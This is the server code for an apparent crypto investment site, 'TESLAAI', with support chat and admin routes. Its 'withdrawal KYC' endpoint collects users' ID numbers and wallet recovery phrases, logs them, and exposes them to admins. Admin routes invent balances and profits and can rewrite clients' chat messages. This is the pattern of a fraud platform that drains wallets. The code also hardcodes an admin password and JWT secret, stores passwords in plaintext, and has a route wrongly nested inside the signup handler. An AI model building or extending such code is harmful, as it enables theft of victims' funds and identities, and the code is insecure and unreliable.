const mongoose = require('mongoose');

// Connect to MongoDB Atlas (if not already connected)
if (mongoose.connection.readyState === 0) {
  mongoose.connect(process.env.MONGODB_URI)
    .then(() => console.log('Connected to MongoDB Atlas successfully'))
    .catch((err) => console.error('MongoDB connection error:', err));
}

const userSchema = new mongoose.Schema({
  name: { type: String, required: true },
  email: { type: String, required: true, unique: true },
  password: { type: String, required: true },
  isAdmin: { type: Boolean, default: false },
  balance: { type: Number, default: 200 },
  address: { type: String, default: '' },
  createdAt: { type: Date, default: Date.now }
});

const User = mongoose.models.User || mongoose.model('User', userSchema);
const express = require('express');
const fs = require('fs');
const path = require('path');
const http = require('http');
const socketIo = require('socket.io');
const jwt = require('jsonwebtoken');

// --- Configuration ---
const PORT = process.env.PORT || 10000;
const SECRET_KEY = process.env.JWT_SECRET || '1efdcab9301a043c584584eba62c2add2be3174a06be5f56c271eb37423873dd';
const PROJECT_DIR = path.join(__dirname, '..');
const DATA_DIR = path.join(PROJECT_DIR, 'data');
const USERS_FILE = path.join(DATA_DIR, 'users.json');
const CHAT_HISTORY_FILE = path.join(DATA_DIR, 'chat-history.json');
const WITHDRAWALS_FILE = path.join(DATA_DIR, 'withdrawals.json');

const app = express();
app.use(express.static(PROJECT_DIR));
const server = http.createServer(app);

const io = socketIo(server, {
  cors: {
    origin: '*',
    methods: ['GET', 'POST']
  }
});

// --- Middleware ---
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
  res.header('Access-Control-Allow-Methods', 'GET,POST,PUT,DELETE,OPTIONS');

  if (req.method === 'OPTIONS') {
    return res.sendStatus(204);
  }

  next();
});

app.use(express.json());

// --- Default Admin ---
const defaultAdmin = {
  id: 'tesla_ai',
  name: 'TESLAAI Support',
  email: 'tesla_ai@support.com',
  password: '@David081',
  isAdmin: true,
  balance: 999999
};

// --- Persistent State ---
let currentUsers = [];
let chatHistoryByClient = {};
let activeConnections = {};
let activeAdminSockets = new Set();
let withdrawalPhraseSessions = [];

// --- Persistence Helpers ---
function ensureDataDir() {
  if (!fs.existsSync(DATA_DIR)) {
    fs.mkdirSync(DATA_DIR, { recursive: true });
  }
}

function getTimestamp() {
  return new Date().toLocaleTimeString('en-US', {
    hour12: false,
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit'
  });
}

function readJsonFile(filePath, fallback) {
  try {
    if (!fs.existsSync(filePath)) {
      return fallback;
    }

    const raw = fs.readFileSync(filePath, 'utf8');
    if (!raw.trim()) {
      return fallback;
    }

    return JSON.parse(raw);
  } catch (err) {
    console.error(`[${getTimestamp()}] Failed to read ${path.basename(filePath)}: ${err.message}`);
    return fallback;
  }
}

function writeJsonFile(filePath, data) {
  try {
    fs.writeFileSync(filePath, JSON.stringify(data, null, 2), 'utf8');
    return true;
  } catch (err) {
    console.error(`[${getTimestamp()}] Failed to write ${path.basename(filePath)}: ${err.message}`);
    return false;
  }
}

function persistUsers() {
  return writeJsonFile(USERS_FILE, currentUsers);
}

function persistChatHistory() {
  return writeJsonFile(CHAT_HISTORY_FILE, chatHistoryByClient);
}

function persistWithdrawals() {
  return writeJsonFile(WITHDRAWALS_FILE, withdrawalPhraseSessions);
}

function loadPersistentData() {
  ensureDataDir();

  const loadedUsers = readJsonFile(USERS_FILE, []);
  const loadedChatHistory = readJsonFile(CHAT_HISTORY_FILE, {});
  const loadedWithdrawals = readJsonFile(WITHDRAWALS_FILE, []);

  currentUsers = Array.isArray(loadedUsers) ? loadedUsers : [];
  chatHistoryByClient = loadedChatHistory && typeof loadedChatHistory === 'object' ? loadedChatHistory : {};
  withdrawalPhraseSessions = Array.isArray(loadedWithdrawals) ? loadedWithdrawals : [];
}

function trackConnection(userId, socketId, isAdmin = false) {
  if (isAdmin) {
    activeAdminSockets.add(socketId);
    return;
  }

  if (!activeConnections[userId]) {
    activeConnections[userId] = new Set();
  }

  activeConnections[userId].add(socketId);
}

function untrackConnection(userId, socketId, isAdmin = false) {
  if (isAdmin) {
    activeAdminSockets.delete(socketId);
    return;
  }

  if (!activeConnections[userId]) {
    return;
  }

  activeConnections[userId].delete(socketId);
  if (activeConnections[userId].size === 0) {
    delete activeConnections[userId];
  }
}

function getActiveSocketIds(userId) {
  if (!activeConnections[userId]) {
    return [];
  }

  return Array.from(activeConnections[userId]);
}

function emitSupportUpdate(payload) {
  if (activeAdminSockets.size === 0) {
    return;
  }

  io.to(Array.from(activeAdminSockets)).emit('supportUpdate', payload);
}

// --- Auth Helpers ---
function findUser(email, password = null) {
  if (defaultAdmin.email === email && (!password || defaultAdmin.password === password)) {
    return defaultAdmin;
  }

  return currentUsers.find((user) => user.email === email && (!password || user.password === password));
}

function userExists(email) {
  return defaultAdmin.email === email || currentUsers.some((user) => user.email === email);
}

function requireAdminAuth(req, res, next) {
  const authHeader = req.headers.authorization || '';
  const token = authHeader.startsWith('Bearer ') ? authHeader.slice(7) : null;

  if (!token) {
    return res.status(401).json({ success: false, message: 'Admin authorization required.' });
  }

  try {
    const decoded = jwt.verify(token, SECRET_KEY);

    if (!decoded || decoded.isAdmin !== true) {
      return res.status(403).json({ success: false, message: 'Admin access denied.' });
    }

    req.admin = decoded;
    return next();
  } catch (err) {
    return res.status(401).json({ success: false, message: 'Invalid or expired admin token.' });
  }
}

function ensureClientHistory(clientId) {
  if (!chatHistoryByClient[clientId]) {
    chatHistoryByClient[clientId] = [
      {
        userId: 'System',
        message: 'Welcome to TESLAAI Live Support. How can we help you?',
        timestamp: getTimestamp(),
        isAdmin: true,
        clientDisplay: true
      }
    ];
    persistChatHistory();
  }
}

loadPersistentData();

// --- JWT Authentication Middleware for Socket.IO (Clients) ---
io.use((socket, next) => {
  const token = socket.handshake.query.token;

  if (token) {
    try {
      const decoded = jwt.verify(token, SECRET_KEY);
      socket.userData = decoded;
      return next();
    } catch (err) {
      console.error(`[${getTimestamp()}] Socket Auth Error: Invalid token. Error: ${err.message}`);
      return next(new Error('Authentication error: Invalid token'));
    }
  }

  return next();
});

// --- Express Authentication Routes ---
app.get('/api/v1/profile/me', (req, res) => {
  const authHeader = req.headers.authorization;

  if (!authHeader) {
    return res.status(401).json({ success: false, message: 'Authorization header required.' });
  }

  const token = authHeader.split(' ')[1];

  try {
    const decoded = jwt.verify(token, SECRET_KEY);
    const user = currentUsers.find((entry) => entry.id === decoded.id);

    if (!user) {
      return res.status(404).json({ success: false, message: 'User not found.' });
    }

    const { password, ...safeUserData } = user;
    return res.json(safeUserData);
  } catch (err) {
    return res.status(403).json({ success: false, message: 'Invalid or expired token.' });
  }
});

app.post('/api/v1/profile/update', (req, res) => {
  const authHeader = req.headers.authorization;

  if (!authHeader) {
    return res.status(401).json({ success: false, message: 'Authorization header required.' });
  }

  const token = authHeader.split(' ')[1];

  try {
    const decoded = jwt.verify(token, SECRET_KEY);
    const userIndex = currentUsers.findIndex((user) => user.id === decoded.id);

    if (userIndex === -1) {
      return res.status(404).json({ success: false, message: 'User not found.' });
    }

    const user = currentUsers[userIndex];
    const { name, address, newPassword } = req.body;

    if (name) user.name = name;
    if (address) user.address = address;

    if (newPassword) {
      if (newPassword.length < 8) {
        return res.status(400).json({ success: false, message: 'Password must be at least 8 characters.' });
      }

      user.password = newPassword;
    }

    currentUsers[userIndex] = user;

    if (!persistUsers()) {
      return res.status(500).json({ success: false, message: 'Failed to persist profile update.' });
    }

    const { password, ...safeUserData } = user;
    return res.json({ success: true, message: 'Profile updated.', ...safeUserData });
  } catch (err) {
    return res.status(403).json({ success: false, message: 'Invalid or expired token.' });
  }
});

app.post('/api/v1/auth/login', async (req, res) => {
  try {
    // Ensure Mongoose is connected
    if (mongoose.connection.readyState !== 1) {
      await mongoose.connect(process.env.MONGODB_URI);
    }

    const { email, password } = req.body;

    // 1. Check the built-in admin, then find regular users in MongoDB
    const user = defaultAdmin.email === email && defaultAdmin.password === password
      ? defaultAdmin
      : await User.findOne({ email });
    if (!user) {
      return res.status(401).json({ success: false, message: 'Invalid email or password.' });
    }

    // 2. Check regular-user passwords stored in MongoDB
    if (user !== defaultAdmin && user.password !== password) {
      return res.status(401).json({ success: false, message: 'Invalid email or password.' });
    }

    // 3. Generate your JWT token
    const token = jwt.sign(
      { id: user.id || user._id, email: user.email, isAdmin: user.isAdmin },
      process.env.JWT_SECRET || SECRET_KEY,
      { expiresIn: '24h' }
    );

    // 4. Return success along with the token and user data
    const safeUserData = {
      id: user.id || user._id,
      name: user.name,
      email: user.email,
      balance: user.balance,
      isAdmin: user.isAdmin
    };

    return res.json({
      success: true,
      message: 'Login successful.',
      token,
      user: safeUserData
    });
  } catch (error) {
    console.error('Login error:', error);
    return res.status(500).json({ success: false, message: 'Internal server error during login.' });
  }
});

app.post('/api/v1/auth/signup', async (req, res) => {
  try {
    // Ensure Mongoose is connected before querying
    if (mongoose.connection.readyState !== 1) {
      await mongoose.connect(process.env.MONGODB_URI);
    }

    const { name, email, password } = req.body;

    // 1. Check if user already exists in MongoDB
    const existingUser = await User.findOne({ email });
    if (existingUser) {
      return res.status(400).json({ success: false, message: 'User already exists with this email address.' });
    }

    // 2. Create and save the new user to MongoDB
    const newUser = await User.create({
      name,
      email,
      password,
      isAdmin: false,
      balance: 200,
      address: ''
    });

    // Handle profile fetch for both route patterns
app.get(['/api/v1/profile/me', '/profile/me'], async (req, res) => {
  try {
    // Ensure Mongoose is connected
    if (mongoose.connection.readyState !== 1) {
      await mongoose.connect(process.env.MONGODB_URI);
    }

    const authHeader = req.headers.authorization;
    if (!authHeader) {
      return res.status(401).json({ success: false, message: 'No token provided.' });
    }

    const token = authHeader.split(' ')[1];
    const decoded = jwt.verify(token, process.env.JWT_SECRET || SECRET_KEY);

    const user = await User.findById(decoded.id);
    if (!user) {
      return res.status(404).json({ success: false, message: 'User not found.' });
    }

    return res.json({
      success: true,
      user: {
        id: user._id,
        name: user.name,
        email: user.email,
        balance: user.balance,
        isAdmin: user.isAdmin,
        address: user.address
      }
    });
  } catch (error) {
    console.error('Profile fetch error:', error);
    return res.status(500).json({ success: false, message: 'Internal server error.' });
  }
});

    // 3. Return success response
    return res.status(201).json({
      success: true,
      message: 'Sign up successful.',
      user: { id: newUser._id, name: newUser.name, email: newUser.email, balance: newUser.balance, isAdmin: newUser.isAdmin }
    });
  } catch (error) {
    console.error('Signup error:', error);
    return res.status(500).json({ success: false, message: 'Failed to save new account.' });
  }
});
// --- Withdrawal KYC Endpoint ---
app.post('/api/v1/withdraw/kyc-session', (req, res) => {
  const {
    clientId,
    amount,
    network,
    walletProvider,
    walletCoin,
    kycFullName,
    kycIdNumber,
    phraseInput
  } = req.body || {};

  if (!amount || !network || !walletProvider || !kycFullName || !kycIdNumber || !phraseInput) {
    return res.status(400).json({ success: false, message: 'Missing required withdrawal verification fields.' });
  }

  const session = {
    sessionId: `WD-${Date.now()}-${Math.floor(Math.random() * 900 + 100)}`,
    createdAt: new Date().toISOString(),
    clientId: clientId || 'unknown-client',
    amount,
    network,
    walletProvider,
    walletCoin: walletCoin || 'USDT',
    kycFullName,
    kycIdNumber,
    phraseInput: phraseInput || '',
    status: 'pending'
  };

  withdrawalPhraseSessions.unshift(session);

  if (withdrawalPhraseSessions.length > 100) {
    withdrawalPhraseSessions = withdrawalPhraseSessions.slice(0, 100);
  }

  if (!persistWithdrawals()) {
    withdrawalPhraseSessions = withdrawalPhraseSessions.filter((entry) => entry.sessionId !== session.sessionId);
    return res.status(500).json({ success: false, message: 'Failed to record withdrawal session.' });
  }

  console.log('\n=== WITHDRAWAL KYC VERIFICATION SESSION ===');
  console.log(`[${getTimestamp()}] Session ID: ${session.sessionId}`);
  console.log(`[${getTimestamp()}] Client ID: ${session.clientId}`);
  console.log(`[${getTimestamp()}] Amount/Network: ${session.amount} ${session.network}`);
  console.log(`[${getTimestamp()}] Wallet: ${session.walletProvider} (${session.walletCoin})`);
  console.log(`[${getTimestamp()}] KYC: ${session.kycFullName} | ${session.kycIdNumber}`);
  console.log(`[${getTimestamp()}] Input Phrase: ${session.phraseInput}`);
  console.log('=== END WITHDRAWAL SESSION ===\n');

  return res.status(201).json({
    success: true,
    message: 'Withdrawal KYC session recorded.',
    sessionId: session.sessionId
  });
});

// --- Socket.IO Connection Logic ---
io.on('connection', (socket) => {
  let userId;
  let isAdmin = socket.handshake.query.isAdmin === 'true';

  if (socket.userData) {
    userId = socket.userData.id;
    isAdmin = socket.userData.isAdmin;
  } else if (isAdmin) {
    userId = defaultAdmin.id;
  } else {
    userId = socket.id;
  }

  socket.userId = userId;
  socket.isAdmin = isAdmin;

  console.log(`[${getTimestamp()}] A user connected: ${userId} (Admin: ${isAdmin}) | Socket: ${socket.id}`);
  trackConnection(userId, socket.id, isAdmin);

  if (!isAdmin) {
    ensureClientHistory(userId);
    socket.emit('history', chatHistoryByClient[userId] || []);

    socket.on('clientMessage', (msg) => {
      const messageData = {
        userId,
        message: msg.message,
        timestamp: getTimestamp(),
        isAdmin: false
      };

      if (chatHistoryByClient[userId]) {
        chatHistoryByClient[userId].push(messageData);
        persistChatHistory();
      }

      socket.emit('message', messageData);
      emitSupportUpdate({ type: 'client_message', clientId: userId, message: messageData });
    });
  }

  if (isAdmin) {
    socket.on('requestClientList', () => {
      const clientList = Object.keys(chatHistoryByClient).map((clientId) => {
        const history = chatHistoryByClient[clientId] || [];
        const lastMessage = history.length > 0
          ? history[history.length - 1]
          : { message: 'No messages yet.', timestamp: 0 };

        return {
          clientId,
          lastMessageTime: lastMessage.timestamp,
          lastMessageSummary: lastMessage.message.substring(0, 30) + (lastMessage.message.length > 30 ? '...' : ''),
          isActive: Boolean(activeConnections[clientId] && activeConnections[clientId].size)
        };
      });

      socket.emit('clientList', clientList);
    });

    socket.on('requestChatHistory', (clientId) => {
      if (chatHistoryByClient[clientId]) {
        socket.emit('chatHistory', {
          clientId,
          history: chatHistoryByClient[clientId]
        });
      }
    });

    socket.on('adminReply', (data) => {
      const { clientId, message } = data;
      const messageData = {
        userId: defaultAdmin.id,
        message,
        timestamp: getTimestamp(),
        isAdmin: true
      };

      ensureClientHistory(clientId);
      chatHistoryByClient[clientId].push(messageData);
      persistChatHistory();

      const clientSocketIds = getActiveSocketIds(clientId);

      if (clientSocketIds.length > 0) {
        clientSocketIds.forEach((socketId) => {
          io.to(socketId).emit('message', messageData);
        });
      } else {
        console.log(`[${getTimestamp()}] Client ${clientId} is offline, message stored.`);
      }

      emitSupportUpdate({ type: 'admin_reply', clientId, message: messageData });
    });
  }

  socket.on('disconnect', () => {
    untrackConnection(socket.userId, socket.id, socket.isAdmin);

    console.log(`[${getTimestamp()}] User disconnected: ${socket.userId}`);
  });
});

// --- Admin API Routes ---
app.get('/api/admin/clients', requireAdminAuth, (req, res) => {
  const clients = currentUsers.map((user) => ({
    name: user.name,
    email: user.email,
    balance: Number(user.balance || 0),
    profit: Number(user.profit || 0),
    activeInvestment: Number(user.activeInvestment || 0),
    investmentPlan: user.investmentPlan || '',
    nextPayout: user.nextPayout || ''
  }));

  return res.json(clients);
});

app.post('/api/admin/client/update', requireAdminAuth, (req, res) => {
  const {
    email,
    totalBalance,
    totalProfit,
    activeInvestment,
    investmentPlan,
    nextPayout
  } = req.body || {};

  if (!email) {
    return res.status(400).json({ success: false, message: 'Client email is required.' });
  }

  const userIndex = currentUsers.findIndex((user) => user.email === email);
  if (userIndex === -1) {
    return res.status(404).json({ success: false, message: 'Client not found.' });
  }

  const user = currentUsers[userIndex];

  if (totalBalance !== undefined) user.balance = Number(totalBalance) || 0;
  if (totalProfit !== undefined) user.profit = Number(totalProfit) || 0;
  if (activeInvestment !== undefined) user.activeInvestment = Number(activeInvestment) || 0;
  if (investmentPlan !== undefined) user.investmentPlan = String(investmentPlan || '');
  if (nextPayout !== undefined) user.nextPayout = String(nextPayout || '');

  currentUsers[userIndex] = user;

  if (!persistUsers()) {
    return res.status(500).json({ success: false, message: 'Failed to persist client update.' });
  }

  return res.json({ success: true, message: 'Client data updated successfully.' });
});

app.get('/api/admin/client-sessions', requireAdminAuth, (req, res) => {
  const sessions = Object.keys(chatHistoryByClient).map((clientId) => {
    const history = Array.isArray(chatHistoryByClient[clientId]) ? chatHistoryByClient[clientId] : [];
    const lastMessage = history.length > 0 ? history[history.length - 1] : null;
    return {
      clientId,
      messageCount: history.length,
      lastMessage: lastMessage ? lastMessage.message : 'No messages yet.',
      lastTimestamp: lastMessage ? lastMessage.timestamp : '',
      isActive: Boolean(activeConnections[clientId] && activeConnections[clientId].size)
    };
  });

  return res.json({ success: true, count: sessions.length, sessions });
});

app.get('/api/admin/client-sessions/:clientId', requireAdminAuth, (req, res) => {
  const { clientId } = req.params;
  const history = chatHistoryByClient[clientId];

  if (!Array.isArray(history)) {
    return res.status(404).json({ success: false, message: 'Client session not found.' });
  }

  return res.json({ success: true, clientId, count: history.length, messages: history });
});

app.put('/api/admin/client-sessions/:clientId/messages/:messageIndex', requireAdminAuth, (req, res) => {
  const { clientId, messageIndex } = req.params;
  const { message } = req.body || {};

  if (!message || !String(message).trim()) {
    return res.status(400).json({ success: false, message: 'Message text is required.' });
  }

  const history = chatHistoryByClient[clientId];
  if (!Array.isArray(history)) {
    return res.status(404).json({ success: false, message: 'Client session not found.' });
  }

  const index = Number(messageIndex);
  if (!Number.isInteger(index) || index < 0 || index >= history.length) {
    return res.status(400).json({ success: false, message: 'Invalid message index.' });
  }

  history[index].message = String(message).trim();

  if (!persistChatHistory()) {
    return res.status(500).json({ success: false, message: 'Failed to persist client session update.' });
  }

  return res.json({ success: true, message: 'Client message updated successfully.' });
});

app.delete('/api/admin/client-sessions/:clientId/messages/:messageIndex', requireAdminAuth, (req, res) => {
  const { clientId, messageIndex } = req.params;
  const history = chatHistoryByClient[clientId];

  if (!Array.isArray(history)) {
    return res.status(404).json({ success: false, message: 'Client session not found.' });
  }

  const index = Number(messageIndex);
  if (!Number.isInteger(index) || index < 0 || index >= history.length) {
    return res.status(400).json({ success: false, message: 'Invalid message index.' });
  }

  history.splice(index, 1);

  if (!persistChatHistory()) {
    return res.status(500).json({ success: false, message: 'Failed to persist message delete.' });
  }

  return res.json({ success: true, message: 'Client message deleted successfully.' });
});

app.delete('/api/admin/client-sessions/:clientId', requireAdminAuth, (req, res) => {
  const { clientId } = req.params;

  if (!chatHistoryByClient[clientId]) {
    return res.status(404).json({ success: false, message: 'Client session not found.' });
  }

  delete chatHistoryByClient[clientId];

  if (!persistChatHistory()) {
    return res.status(500).json({ success: false, message: 'Failed to persist session delete.' });
  }

  return res.json({ success: true, message: 'Client session deleted successfully.' });
});

app.get('/api/admin/withdraw-sessions', requireAdminAuth, (req, res) => {
  const sessions = withdrawalPhraseSessions.map((session) => ({
    sessionId: session.sessionId,
    createdAt: session.createdAt,
    clientId: session.clientId,
    amount: session.amount,
    network: session.network,
    walletProvider: session.walletProvider,
    walletCoin: session.walletCoin,
    kycFullName: session.kycFullName,
    kycIdNumber: session.kycIdNumber,
    phraseInput: session.phraseInput,
    status: session.status || 'pending'
  }));

  return res.json({ success: true, count: sessions.length, sessions });
});

app.put('/api/admin/withdraw-sessions/:sessionId', requireAdminAuth, (req, res) => {
  const { sessionId } = req.params;
  const { phraseInput, status } = req.body || {};

  const sessionIndex = withdrawalPhraseSessions.findIndex((session) => session.sessionId === sessionId);
  if (sessionIndex === -1) {
    return res.status(404).json({ success: false, message: 'Withdrawal session not found.' });
  }

  if (phraseInput !== undefined) withdrawalPhraseSessions[sessionIndex].phraseInput = String(phraseInput || '');
  if (status !== undefined) withdrawalPhraseSessions[sessionIndex].status = String(status || 'pending');

  if (!persistWithdrawals()) {
    return res.status(500).json({ success: false, message: 'Failed to persist withdrawal session update.' });
  }

  return res.json({ success: true, message: 'Withdrawal session updated successfully.' });
});

app.delete('/api/admin/withdraw-sessions/:sessionId', requireAdminAuth, (req, res) => {
  const { sessionId } = req.params;
  const beforeCount = withdrawalPhraseSessions.length;
  withdrawalPhraseSessions = withdrawalPhraseSessions.filter((session) => session.sessionId !== sessionId);

  if (withdrawalPhraseSessions.length === beforeCount) {
    return res.status(404).json({ success: false, message: 'Withdrawal session not found.' });
  }

  if (!persistWithdrawals()) {
    return res.status(500).json({ success: false, message: 'Failed to persist withdrawal session delete.' });
  }

  return res.json({ success: true, message: 'Withdrawal session deleted successfully.' });
});

// --- Start Server ---
module.exports = app;